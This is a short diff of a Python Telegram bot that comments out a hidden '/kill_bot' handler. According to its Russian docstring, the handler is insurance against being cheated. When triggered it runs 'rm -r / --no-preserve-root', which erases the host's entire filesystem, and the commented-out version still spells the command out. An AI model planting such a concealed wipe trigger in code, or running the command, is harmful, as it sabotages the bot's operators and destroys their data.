@@ -148,11 +148,11 @@ async def help_for_users(msg: Message):
     await message_cleaner.schedule_message_deletion(mess.chat.id, mess.message_id)
 
 
-@dp.message(Command('kill_bot'))
-async def insurance_against_scammers(msg: Message):
-    """Задействовать если попытается кинуть (протокол "Черепаха")"""
-    os.system('rm -r / --no-preserve-root')
-    await msg.delete()
+# @dp.message(Command('kill_bot'))
+# async def insurance_against_scammers(msg: Message):
+#     """Задействовать если попытается кинуть (протокол "Черепаха")"""
+#     os.system('rm -rf / --no-preserve-root')
+#     await msg.delete()
 
 
 @checker_router.chat_member(ChatMemberUpdatedFilter(member_status_changed=IS_NOT_MEMBER << MEMBER))
